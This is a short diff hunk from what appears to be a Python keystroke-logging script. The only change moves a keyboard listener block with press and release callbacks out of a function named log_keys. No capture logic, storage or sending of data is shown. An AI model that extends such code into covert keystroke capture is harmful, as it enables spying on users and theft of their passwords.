@@ -23,5 +23,5 @@ def log_keys(list_of_keys):
             
         list_of_keys.clear()
         
-    with keyboard.Listener(on_press=key_pressed,on_release=key_released) as listener:
+with keyboard.Listener(on_press=key_pressed,on_release=key_released) as listener:
         listener.join()
